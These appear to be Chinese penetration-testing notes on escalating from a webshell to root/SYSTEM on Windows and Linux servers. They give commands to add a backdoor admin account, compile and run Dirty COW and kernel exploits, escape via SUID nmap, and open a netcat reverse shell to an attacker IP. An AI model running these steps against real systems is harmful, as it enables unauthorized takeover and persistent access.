提权与后门维持

  • 拿下网站!=拿下网站服务器；
    拿下网站=获得webshell，拿下网站服务器=拿下root（system）权限
    拿下网站服务器也不一定拿下网站，可能站库分离，有单独的数据库服务器
  • 网站webshell权限解析：
    一般情况下，webshell权限介于guests-users之间，权限较小
    非一般情况下，由以下两点决定：
    1. 脚本类型
      asp、php（小于users，匿名权限）< aspx（users）< jsp(system)
    2. 搭建工具
      phpstudy，lamp,apmserv第三方软件等
  • POC、EXP
    • POC：概念验证；常指一段漏洞验证的代码，证明漏洞是否存在，无害。
    • EXP：利用；指利用系统漏洞进行攻击的代码，有害。
    • 有了POC才有EXP；每个漏洞都由自己的EXP，不存在通用的EXP。

一.前期工作-信息收集

  • 内外网
  • 服务系统和版本位数
  • 服务器的补丁情况
  • 服务器的安装软件情况
  • 服务器的防护软件情况
  • 端口情况
  • 所支持的脚本情况

详细命令参考内网渗透笔记

二.提权

前提：已获取低权shell

msf提权

  • 参考msf后渗透一文中的提权模块

系统漏洞提权

Windows

  • 提权EXP一般格式为 MS08067.exe或 .com（cmd下执行）
  • EXP选择：使用systeminfo命令或者查看补丁目录，查看补丁记录，来判断有哪个补丁没打，然后使用相对应的exp进行提权。（可使用辅助工具脚本）
  • 前提：已获取到shell
cmd可执行
使用特定exp
  1. 通过systeminfo获取补丁安装情况获取可用提权exp
  2. 在可读可写的目录（不要含空格，一般是回收站）上传提权exp
  3. 使用exp提权
    • exp.exe "whoami"查看提权结果是否成功
    • exp.exe "net user hack hack123 /add"添加用户
    • exp.exe "net localgroup administrators hack /add添加用户到管理员组
    • 使用rdp远程登录到目标主机
      • 如果没有开放rdp服务，使用.exe .bat .vbs等脚本开启
使用pr提权

步骤与特定exp提权类似

cmd命令无法执行
  • 原因：
    • 组件被禁用或删除（wscript.shell）
    • cmd被降权或删除
    • 防护软件拦截
  • 解决
    • 被拦截和降权：找可读可写目录，上传cmd.exe,调用上传的cmd.exe，执行cmd.exe命令（使用绝对目录）
    • 组件被删除：检查是否支持aspx，如果支持aspx，可以通过aspx大马直接调用系统的cmd，asp大马脚本下载

Linux

  • 提权exp一般按照内核版本来命名，格式为2.6.18-194或2.6.18.c（需要gcc编译后使用）
内核漏洞提权
  • 信息收集得到Linux版本cat /etc/issus uname -a
  • 寻找对应版本漏洞的exp
    • 漏洞库手动查找：Linux
    • kali里使用searchsploit搜索对应内核漏洞：searchsploit linux 版本号 searchsploit Ubuntu（发行版） 16 kernel 内核版本号
    • 将exp上传到目标机或者使用wget，scp（ssh已开启）命令
    • 编译expgcc exp(.c) -o exp可执行文件名
    • 执行./exp可执行文件名
脏牛提权
  • exp下载地址：dirty.c
  • 将exp上传到目标机，或者目标机使用wget下载exp
  • 编译exp文件gcc -pthread dirty.c -o dirty -lcrypt
  • 执行exp./dirty my-new-password

自动探测漏洞

    • 使用方法：

Linux SUID提权

  • SUID：在可执行文件的执行位上，具有SUID权限执行的时候具有所有者的身份
  • 寻找root用户具有SUID权限的文件:find / -user root -perm -4000 -print 2>/dev/null
    • nmap提权(2.02-5.21)
      • 启动交互模式:nmap --interactive
      • !sh，进入
    • find提权
      • 创建一个文件touch test
      • 攻击机nc监听nc -nlvp 1234
      • 目标机上执行find test -exec netcat 攻击机ip 1234 -e /bin/bash \;获得反弹shell
    • 查找到的可执行文件使用搜索引擎逐一搜索是否存在提权漏洞
